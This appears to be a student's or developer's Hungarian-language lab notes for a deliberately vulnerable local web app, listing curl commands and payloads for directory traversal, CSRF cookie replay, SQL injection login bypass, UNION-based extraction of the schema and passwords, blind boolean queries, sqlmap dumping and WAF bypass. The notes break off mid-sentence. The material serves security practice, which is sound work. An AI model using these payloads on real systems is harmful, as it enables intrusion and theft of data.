Directory-Traversal tesztelése: 
    localhost:8000/read-file/ endpointon lehet ügyeskedni. Ehhez nem feltétlen kell curl, 
    bár a gyors egymásutáni parancsok/scriptek futtatásához előnyösebb.
    Alapvetően az endpoint a /static_files könyvtárból olvas.
    Pl.:
        curl "http://localhost:8000/read-file/?filename=example.txt"
        output: "Ez csak egy random példa"
    Különösebb védelem nélkül könnyedén ki lehet olvasni más könyvtárak fájljait is.
    Pl.:
        curl "http://localhost:8000/read-file/?filename=../secret.txt"
        vagy "...filename=%2e%2e/secret.txt"
        vagy éppen "...filename=%252E%252E%252Fsecret.txt" (bár ez inkább csak Microsoft ISS szerverre jellemző - ez nem is fontos igazából)
        output: "Szupertitkos szöveg ^o.o^"

CSRF szimulálása:
1. Bejelentkezés
    Ez lehet localhost:8000/docs oldalon...
        Ilyenkor a cookie elmentésre kerül a /Storage/Cookies/ helyen session_id néven
    Vagy terminalból curl segítségével, csak akkor ügyelni kell a cookie kimentésére [-c ~ cookie-jar]
    curl -X POST "http://localhost:8000/login/" -d "username=admin' --&password=vmi" -c cookies.txt
    
    
2. Cookie hijacking - szimulálva a csrf_expl.html-lel
    Hogy sikeresen meg tudja változtatni a felhasználó jelszavát, 
    a cookie-t ki kell nyerni és el kell küldeni azt a http metódus fejlécében.
    Ha böngészőben "jelentkezünk be", akkor az alábbi módon lehet működésre bírni:
        python -m http.server 9000
    Vagy ha a terminálnál maradunk, akkor az előbb kimentett cookie-t használjuk az alábbi módon:
        curl -X POST "http://localhost:8000/update-password/" -d "new_password=uj_jelszo" -b cookies.txt

3. Ennyi

SQL-Injection tesztelése
Sikeres SQL parancsok (Curl tesztelés):
Minden parancs így kezdődik egyelőre curl -X POST "http://localhost:8000/login/" -d
[login bypass] - 
    -  "username=admin' --&password=vmi" 
    -  "username=admin' /*&password=vmi"
    -  "username=' or 1=1--&password=vmi"
    -  "username=' or 1=1 /*&password=vmi"

[táblák lekérdezése UNION segítségével] - (ehhez előbb valami felhasználói felületre lesz szükség)

XSS-ötletelés
https://owasp.org/www-community/Types_of_Cross-Site_Scripting
Reflected XSS
Stored XSS
DOM Based XSS ... 

További sérülékenységek és vagy valami exploitok bemutatása/gyakorlása:
    -valami brute force bejelentkezési oldal (hydra)
    -kriptográfiai algoritmusok
    -fájl feltöltés
    -fájl letöltés/fájl tartalom kiiratás
    -...
    src: DVWA


SQLi tesztelés:
    _1_easy_login.py
        - admin'--
        - admin' OR '1'='1
        ____________innen igazából részletkérdés______________________
        - 'UNION SELECT 1,1,1,1 FROM users
        - 'UNION SELECT name, sql, type, null FROM sqlite_master--
    _2_easy_search.py
        - 'UNION SELECT password from users--
    _3_data_leak.py
    itt alapvetően az volt a terv, hogy mivel nemtudjuk a jelszót, egy substring checkel megtudnánk szerezni a jelszót, 
    vagy éppen itt lehetne használni a sqlmap-et ha valami bonyolultabb adatbázis lenne bújna meg a háttérbenb
    alapvetően valami ilyesmi bonyolultságú tesztelgetés lenne a cél:
    1 UNION SELECT 1/CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,2)='12' THEN 0 ELSE 1 END--
    itt a gondolat a lekérdezés mögött az lenne, hogy amikor jó a substring, akkor 0-t v nullt kapunk vissza, amikor nem, akkor 1-et
    ezt még így nem sikerült implementálni... helyette az előző feladathoz hasonló valamit kapunk, felhasználónév helyett id-val
        - 1 UNION SELECT password FROM users--
    _4_blind_boolean.py
    ez egy brute force feladat, tipikusan sqlmap-et lehetne itt használni
    így minden adatot kinyerhetünk, ami kell vele együtt a flag-et is
    sqlmap -u "http://localhost:8000/sqli/4?username=*" --level=5 --risk=3 --batch --dump 
    
    _5_waf_bypass.py
    az egyszerűbb megoldások itt már nem működnek, igaz elég hard-coded megoldás,de egyelőre ennyit tudtam megoldani
    valamiért a char() függvény nem akar működni beágyazva, úgyhogy arra majd még !!!kell egy megoldás!!!
        - admin' UNION SELECT 'admin', null, null, null FROM users--
        - admin' UNION SELECT username, null, null, null FROM users--
    _6_admin_pw_change.py
    itt a 

